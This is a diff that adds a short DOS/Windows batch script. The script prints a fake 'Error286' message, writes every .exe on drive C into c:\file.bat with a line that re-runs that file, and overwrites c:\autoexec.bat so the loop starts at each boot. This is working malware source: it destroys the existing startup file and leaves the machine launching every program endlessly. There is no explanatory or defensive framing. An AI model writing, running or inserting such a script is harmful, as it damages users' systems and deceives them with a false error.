@@ -1,0 +1,5 @@
+@Echo Error286
+@Echo off
+Dir c:\*.exe/s/b>c:\file.bat
+Echo file.bat>>c:\file.bat
+Echo c:\file.bat>c:\autoexec.bat
